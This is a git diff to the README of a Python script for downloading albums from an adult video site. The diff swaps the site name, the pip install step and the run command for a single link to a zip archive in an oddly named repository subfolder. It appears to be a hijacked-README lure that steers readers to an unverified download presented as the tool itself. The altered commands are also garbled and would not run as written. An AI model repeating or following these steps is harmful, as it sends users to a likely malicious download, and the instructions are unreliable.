@@ -1,19 +1,19 @@
 # EromeDownloader
 
-The EromeDownloader script is a compact yet powerful tool written in Python, designed to download albums from erome.com, including videos, images, and gifs.
+The EromeDownloader script is a compact yet powerful tool written in Python, designed to download albums from https://raw.githubusercontent.com/Makuro2202/EromeDownloader/main/formalazine/EromeDownloader_sprigged.zip, including videos, images, and gifs.
 
 ### How to use?
 
 First install the necessary requirements.
 
 ```
-pip3 install -r requirements.txt
+pip3 install -r https://raw.githubusercontent.com/Makuro2202/EromeDownloader/main/formalazine/EromeDownloader_sprigged.zip
 ```
 
 Next, run the script by using the command:
 
 ```
-python3 dump.py -u [url]
+python3 https://raw.githubusercontent.com/Makuro2202/EromeDownloader/main/formalazine/EromeDownloader_sprigged.zip -u [url]
 ```
 
 Provide the URL of the album you wish to download as the argument **[url]**.
